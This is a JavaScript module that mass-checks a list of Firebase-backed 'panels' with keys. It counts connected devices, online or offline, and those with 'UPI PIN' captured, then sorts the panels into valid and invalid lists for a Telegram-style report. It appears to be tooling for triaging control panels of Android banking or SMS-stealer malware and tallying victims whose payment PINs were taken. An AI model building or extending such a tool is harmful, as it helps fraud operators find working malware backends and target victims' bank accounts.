import { fetchPanelDevices, normalizeFirebaseUrl } from './panelCore.mjs';
import { mapPool } from './pool.mjs';

/**
 * Fast clients-only scan (Telegram automatic tool jaisa) — SMS nahi.
 */
export async function runFirebaseScan(panels, onProgress) {
  const t0 = Date.now();
  const valid = [];
  const invalid = [];
  let online = 0;
  let offline = 0;
  let withPin = 0;
  let panelsDone = 0;
  const CONC = 88;

  await mapPool(panels, CONC, async panel => {
    panelsDone++;
    let devices = [];
    try {
      devices = await fetchPanelDevices(panel);
    } catch {
      devices = [];
    }

    const line = panel.key
      ? `${normalizeFirebaseUrl(panel.url)}|${panel.key}`
      : normalizeFirebaseUrl(panel.url);

    if (!devices.length) {
      invalid.push(line);
    } else {
      valid.push(line);
      for (const d of devices) {
        if (d.status) online++;
        else offline++;
        if (d.hasPin) withPin++;
      }
    }

    if (panelsDone % 40 === 0 || panelsDone === panels.length) {
      onProgress?.({
        panelsDone,
        panelsTotal: panels.length,
        online,
        offline,
        withPin,
        valid: valid.length,
        invalid: invalid.length,
      });
    }
  });

  const elapsed = (Date.now() - t0) / 1000;
  const report = [
    '📊 FIREBASE SCAN REPORT',
    '',
    `🟢 TOTAL ONLINE: ${online.toLocaleString('en-IN')}`,
    `🔴 Total Offline: ${offline.toLocaleString('en-IN')}`,
    `💳 UPI PIN Devices: ${withPin.toLocaleString('en-IN')}`,
    '',
    `🌐 Total Panels: ${panels.length}`,
    `  ✅ Valid: ${valid.length}`,
    `  ❌ Invalid: ${invalid.length}`,
    '',
    `⏱ Time: ${elapsed.toFixed(2)}s`,
  ].join('\n');

  const validFb = valid.join('\n');
  const validPanels = valid
    .map((ln, i) => `#${i + 1} ${ln.split('|')[0]}`)
    .join('\n');
  const invalidPanels = invalid.map((ln, i) => `#${i + 1} ${ln}`).join('\n');

  return {
    report,
    files: {
      valid_firebase: validFb || '(none)',
      valid_panels: validPanels || '(none)',
      invalid_panels: invalidPanels || '(none)',
    },
    stats: {
      online,
      offline,
      withPin,
      valid: valid.length,
      invalid: invalid.length,
      panelsTotal: panels.length,
      panelsDone,
      elapsed,
    },
  };
}